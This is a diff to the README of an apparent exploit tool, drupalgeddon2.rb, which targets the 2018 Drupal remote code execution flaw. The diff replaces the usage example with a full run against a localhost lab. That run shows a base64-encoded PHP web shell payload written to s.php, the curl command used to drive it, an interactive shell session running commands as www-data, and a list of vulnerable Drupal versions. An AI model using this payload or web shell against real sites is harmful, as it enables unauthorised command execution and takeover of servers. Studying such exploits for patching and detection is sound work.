@@ -16,10 +16,31 @@ This method was chosen, as it will return `HTTP 200`, and render the output in t
 #### Usage:
 
 ```bash
-$ ruby drupalgeddon2.rb https://example.com
+$ ruby drupalgeddon2.rb http://localhost/drupal/
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[*] Target : http://localhost/drupal/
+[*] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbImMiXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsiYyJdIC4gIiAyPiYxIiApOyB9 | base64 -d | tee s.php
+--------------------------------------------------------------------------------
+[!] MISSING: http://localhost/drupal/CHANGELOG.txt (404)
+[+] Found  : http://localhost/drupal/core/CHANGELOG.txt (200)
+[+] Drupal!: 8.4.5
+--------------------------------------------------------------------------------
+[*] PHP cmd: exec
+--------------------------------------------------------------------------------
+[+] Target seems to be exploitable! w00hooOO!
+[+] Result: <?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }<span class="ajax-new-content"></span>
+--------------------------------------------------------------------------------
+[*]   curl 'http://localhost/drupal/s.php' -d 'c=whoami'
+--------------------------------------------------------------------------------
+[*] Fake shell:
+drupalgeddon2> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+drupalgeddon2>
+drupalgeddon2> uname -a
+Linux ubuntu140045x64-drupal 3.13.0-144-generic #193-Ubuntu SMP Thu Mar 15 17:03:53 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+drupalgeddon2>
 ```
-
-...afterwards, just call: `curl 'https://example.com/s.php' -d 'c=whoami'`
 
 For proxy support, edit the file, replacing with your values. Example:
 
@@ -34,7 +55,7 @@ proxy_port = 8080
 
 Drupal Advisory ~ https://www.drupal.org/sa-core-2018-002
 
-Vulnerable Versions (Check: https://example.com/CHANGELOG.txt):
+Vulnerable Versions:
 
 * < 7.58        **(Tested)**
 * 8.x < 8.3.9
